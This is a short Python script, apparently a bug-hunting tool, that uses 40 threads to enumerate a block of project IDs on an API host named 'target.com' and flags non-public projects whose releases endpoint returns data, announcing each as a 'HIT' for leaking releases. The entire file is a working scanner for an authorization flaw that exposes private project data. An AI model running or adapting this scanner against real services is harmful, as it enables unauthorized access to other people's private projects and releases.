import requests
from concurrent.futures import ThreadPoolExecutor

BASE_URL = 'https://api.v4.target.com/projects'

def hunt(pid):
    try:
        p_url = f'{BASE_URL}/{pid}'
        p = requests.get(p_url, timeout=1.5).json()
        
        vis = p.get('visibility')
        if vis and vis != 'public':
            leak = requests.get(f'{p_url}/releases', timeout=1.5)
            if leak.status_code == 200 and len(leak.json()) > 0:
                print(f"\n[!!!] HIT: Project {pid} ({vis.upper()}) LEAKING RELEASES")
                return True
    except:
        pass
    return False

if __name__ == '__main__':
    print("[STATUS: RESONANT // SCANNING HIGH-ID VECTORS 70,000,000+]")
    with ThreadPoolExecutor(max_workers=40) as executor:
        executor.map(hunt, range(70000000, 70000500))
    print("\n[OK] Scan Complete.")